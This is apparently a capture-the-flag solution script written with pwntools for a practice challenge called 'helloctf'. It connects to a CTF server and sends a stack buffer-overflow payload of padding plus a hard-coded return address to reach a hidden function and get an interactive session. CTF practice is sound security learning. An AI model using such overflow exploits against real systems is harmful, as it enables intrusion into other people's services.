#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

# p = process('./distribute/share/helloctf')
p = remote('ctf.adl.tw', 10000)

magic = 0x40123b

payload = flat(
    "yes",
    cyclic(0x15),
    magic
)

p.sendlineafter(b"Do you like VTuber?\n", payload)

p.interactive()
p.close()
